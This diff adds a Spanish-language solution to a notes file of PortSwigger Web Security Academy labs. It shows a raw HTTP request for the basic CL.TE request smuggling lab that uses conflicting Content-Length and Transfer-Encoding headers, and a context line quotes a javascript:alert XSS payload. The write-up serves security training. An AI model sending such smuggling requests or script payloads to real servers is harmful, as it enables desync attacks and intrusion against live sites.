@@ -338,6 +338,23 @@ javascript:alert("1337")
 
 ## [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
 
+### [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
+
+#### Solución:
+
+Enviar la siguiente request:
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
